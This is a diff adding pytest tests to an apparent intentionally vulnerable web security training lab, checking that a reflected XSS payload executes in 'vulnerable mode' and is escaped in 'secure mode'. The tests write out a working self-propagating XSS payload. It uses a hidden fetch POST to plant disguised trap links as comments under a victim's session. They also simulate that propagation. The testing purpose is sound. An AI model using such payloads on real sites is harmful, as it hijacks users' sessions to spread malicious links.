@@ -132,3 +132,83 @@ def test_fake_login_xss_behavior_in_both_modes(lab_client, blog_client):
     assert b'<div id="phish-modal">' not in view_sec.data
     assert b'<script>fetch' not in view_sec.data
     assert b'&lt;div id=&#34;phish-modal&#34;&gt;' in view_sec.data or b'&lt;div id="phish-modal"&gt;' in view_sec.data
+
+
+def test_reflected_xss_in_secure_mode(lab_client, blog_client):
+    """In Secure Mode, search query q is HTML-escaped and Reflected XSS payload does not execute."""
+    lab_client.post("/security/toggle", data={"mode": MODE_SECURE})
+
+    payload = (
+        'rust<script>var u="/?q="+encodeURIComponent(new URLSearchParams(location.search).get("q"));'
+        'fetch("/posts/2/comments",{method:"POST",'
+        'body:new URLSearchParams({content:`Solid breakdown! Also check out these benchmarks: '
+        '<a href="${u}">Top 10 Rust performance tips</a>`})})'
+        '.then(function(){location.replace("/?q=rust")})</script>'
+    )
+    res = blog_client.get("/", query_string={"q": payload})
+    assert res.status_code == 200
+    assert b"<script>var u=" not in res.data
+    assert b"&lt;script&gt;var u=" in res.data
+
+
+def test_reflected_xss_action_hijacking_in_vulnerable_mode(lab_client, blog_client):
+    """In Vulnerable Mode, Reflected XSS self-propagating payload renders unescaped without SQL errors."""
+    lab_client.post("/security/toggle", data={"mode": MODE_VULNERABLE})
+
+    payload = (
+        'rust<script>var u="/?q="+encodeURIComponent(new URLSearchParams(location.search).get("q"));'
+        'fetch("/posts/2/comments",{method:"POST",'
+        'body:new URLSearchParams({content:`Solid breakdown! Also check out these benchmarks: '
+        '<a href="${u}">Top 10 Rust performance tips</a>`})})'
+        '.then(function(){location.replace("/?q=rust")})</script>'
+    )
+    res = blog_client.get("/", query_string={"q": payload})
+    assert res.status_code == 200
+    assert b"Database Error:" not in res.data
+    assert b'<script>var u="/?q="+encodeURIComponent' in res.data
+
+    # Disguised link comment renders raw anchor in Vulnerable Mode and escapes in Secure Mode
+    _login_alice(blog_client)
+    link_comment = (
+        'Great post! Check this out: '
+        '<a href="/?q=rust%3Cscript%3Evar%20u%3D%22%2F%3Fq%3D%22%3C%2Fscript%3E">'
+        'Top 10 Rust performance tips</a>'
+    )
+    blog_client.post("/posts/1/comments", data={"content": link_comment}, follow_redirects=True)
+    post_vuln = blog_client.get("/posts/1")
+    assert b'<a href="/?q=rust%3Cscript%3E' in post_vuln.data
+
+    lab_client.post("/security/toggle", data={"mode": MODE_SECURE})
+    post_sec = blog_client.get("/posts/1")
+    assert b'<a href="/?q=rust%3Cscript%3E' not in post_sec.data
+    assert b'&lt;a href=' in post_sec.data
+
+    # Simulate the same-origin fetch POST executed under bob's session propagating the trap link to Post #2
+    blog_client.post("/logout")
+    blog_client.post("/login", data={"username": "bob", "password": "bob123"}, follow_redirects=True)
+    forged_content = (
+        'Solid breakdown! Also check out these benchmarks: '
+        '<a href="/?q=rust%3Cscript%3Evar%20u%3D%22%2F%3Fq%3D%22%3C%2Fscript%3E">'
+        'Top 10 Rust performance tips</a>'
+    )
+    forged_res = blog_client.post(
+        "/posts/2/comments",
+        data={"content": forged_content},
+        follow_redirects=True,
+    )
+    assert forged_res.status_code == 200
+    assert b"<strong>bob</strong>" in forged_res.data
+    assert b"Top 10 Rust performance tips" in forged_res.data
+
+
+def test_lab_guide_reflected_xss_documentation(lab_client):
+    """Verify /lab/guide documents Reflected XSS Silent Action Hijacking and self-propagating payloads."""
+    res = lab_client.get("/lab/guide")
+    assert res.status_code == 200
+    assert b"3. Reflected XSS" in res.data
+    assert b"Self-Propagating Chain" in res.data
+    assert b"SESSION_COOKIE_HTTPONLY" in res.data
+    assert b"payload-rxss-comment" in res.data
+    assert b"payload-rxss-url" in res.data
+    assert b"encodeURIComponent" in res.data
+    assert b"location.replace" in res.data
